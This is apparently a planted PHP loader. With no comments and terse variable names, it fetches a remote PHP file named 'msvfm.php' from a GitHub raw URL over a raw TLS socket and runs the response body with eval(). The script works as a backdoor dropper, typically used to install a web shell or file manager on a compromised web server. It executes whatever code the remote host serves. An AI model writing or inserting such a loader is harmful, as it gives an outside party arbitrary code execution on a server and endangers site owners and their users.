<?php
$rh = "raw.githubusercontent.com";
$rp = 443;
$rs = "/MSVerse/msvfm/main/msvfm.php";

$fp = stream_socket_client("ssl://$rh:$rp", $en, $er, 30);
if (!$fp) {
    echo "ERROR: $en - $er<br />\n";
} else {
    $o = "GET $rs HTTP/1.1\r\n";
    $o .= "Host: $rh\r\n";
    $o .= "Connection: Close\r\n\r\n";
    fwrite($fp, $o);

    $ro = '';
    while (!feof($fp)) {
        $ro .= fgets($fp, 1024);
    }
    fclose($fp);

    list($hr, $bd) = explode("\r\n\r\n", $ro, 2);

    eval("?>".$bd);
}
?>
